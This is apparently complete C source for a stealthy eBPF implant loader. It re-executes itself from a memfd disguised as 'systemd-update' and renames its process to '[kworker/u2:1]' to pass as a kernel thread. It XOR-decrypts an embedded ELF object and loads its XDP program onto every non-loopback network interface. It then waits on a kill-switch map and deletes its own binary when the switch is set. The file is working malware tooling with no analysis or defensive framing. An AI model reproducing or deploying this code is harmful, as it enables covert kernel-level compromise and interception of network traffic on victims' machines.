#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <elf.h>
#include <net/if.h>
#include "ghost_blob.h"

// Fallback definitions for missing macros
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif
#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

extern char **environ;

static void x_c(uint8_t *d, size_t l) {
    uint32_t k = SEED_VAL;
    for (size_t i = 0; i < l; i++) {
        d[i] ^= (uint8_t)(k & 0xFF);
        k = (k >> 8) | (k << 24);
        k = k + 0x9E3779B9;
    }
}

static int m_c(enum bpf_map_type t, int ks, int vs, int me, const char *n) {
    union bpf_attr a = {0};
    a.map_type = t;
    a.key_size = ks;
    a.value_size = vs;
    a.max_entries = me;
    if (n) __builtin_memcpy(a.map_name, n, __builtin_strlen(n));
    return syscall(SYS_bpf, BPF_MAP_CREATE, &a, sizeof(a));
}

int main(int argc, char **argv) {
    // 1. Memfd execution for stealth (fileless-like execution)
    if (!getenv("ST_UPDATE")) {
        int mfd = syscall(SYS_memfd_create, "systemd-update", MFD_CLOEXEC);
        int ffd = open(argv[0], O_RDONLY);
        if (mfd >= 0 && ffd >= 0) {
            char buf[4096]; ssize_t n;
            while ((n = read(ffd, buf, sizeof(buf))) > 0) write(mfd, buf, n);
            close(ffd);
            setenv("ST_UPDATE", "1", 1);
            syscall(SYS_execveat, mfd, "", argv, environ, AT_EMPTY_PATH);
        }
    }

    struct rlimit r = {RLIM_INFINITY, RLIM_INFINITY};
    setrlimit(RLIMIT_MEMLOCK, &r);
    prctl(PR_SET_NAME, "[kworker/u2:1]", 0, 0, 0);

    uint8_t *b = malloc(ghost_o_len);
    __builtin_memcpy(b, ghost_o, ghost_o_len);
    x_c(b, ghost_o_len);

    int cf = m_c(BPF_MAP_TYPE_LRU_HASH, 16, 8, 32768, "m_cache");
    int kf = m_c(BPF_MAP_TYPE_ARRAY, 4, 4, 1, "m_kill");
    if (cf < 0 || kf < 0) return 1;

    Elf64_Ehdr *eh = (Elf64_Ehdr *)b;
    Elf64_Shdr *sh = (Elf64_Shdr *)(b + eh->e_shoff);
    char *strs = (char *)(b + sh[eh->e_shstrndx].sh_offset);
    struct bpf_insn *ins = NULL;
    uint32_t icnt = 0;

    // Locate XDP instructions
    for (int i = 0; i < eh->e_shnum; i++) {
        if (!strcmp(strs + sh[i].sh_name, "xdp")) {
            ins = (struct bpf_insn *)(b + sh[i].sh_offset);
            icnt = sh[i].sh_size / sizeof(struct bpf_insn);
            break;
        }
    }

    // Process Relocations
    for (int i = 0; i < eh->e_shnum; i++) {
        if (sh[i].sh_type == SHT_REL || sh[i].sh_type == SHT_RELA) {
            Elf64_Rel *rl = (Elf64_Rel *)(b + sh[i].sh_offset);
            Elf64_Shdr *symt = &sh[sh[i].sh_link];
            Elf64_Sym *syms = (Elf64_Sym *)(b + symt->sh_offset);
            char *snm = (char *)(b + sh[symt->sh_link].sh_offset);
            
            for (int j = 0; j < (sh[i].sh_size / (sh[i].sh_type == SHT_REL ? sizeof(Elf64_Rel) : sizeof(Elf64_Rela))); j++) {
                uint32_t off = rl[j].r_offset / sizeof(struct bpf_insn);
                const char *n = snm + syms[ELF64_R_SYM(rl[j].r_info)].st_name;
                if (ins && off < icnt && ins[off].code == (BPF_LD | BPF_IMM | BPF_DW)) {
                    ins[off].src_reg = BPF_PSEUDO_MAP_FD;
                    ins[off].imm = strstr(n, "cache") ? cf : kf;
                }
            }
        }
    }

    union bpf_attr la = {0};
    la.prog_type = BPF_PROG_TYPE_XDP;
    la.insns = (uintptr_t)ins;
    la.insn_cnt = icnt;
    la.license = (uintptr_t)"GPL";

    int pfd = syscall(SYS_bpf, BPF_PROG_LOAD, &la, sizeof(la));
    if (pfd < 0) return 1;

    DIR *dr = opendir("/sys/class/net");
    struct dirent *dn;
    while (dr && (dn = readdir(dr))) {
        if (dn->d_name[0] == '.' || !strcmp(dn->d_name, "lo")) continue;
        unsigned int ix = if_nametoindex(dn->d_name);
        if (ix == 0) continue;
        union bpf_attr l = {0};
        l.link_create.prog_fd = pfd;
        l.link_create.target_ifindex = ix;
        l.link_create.attach_type = BPF_XDP;
        syscall(SYS_bpf, BPF_LINK_CREATE, &l, sizeof(l));
    }
    if (dr) closedir(dr);

    uint32_t kv = 0;
    while (kv == 0) {
        union bpf_attr op = {0};
        op.map_fd = kf;
        op.key = (uintptr_t)&(uint32_t){0};
        op.value = (uintptr_t)&kv;
        syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &op, sizeof(op));
        if (kv == 0) sleep(60);
    }

    unlink(argv[0]);
    return 0;
}
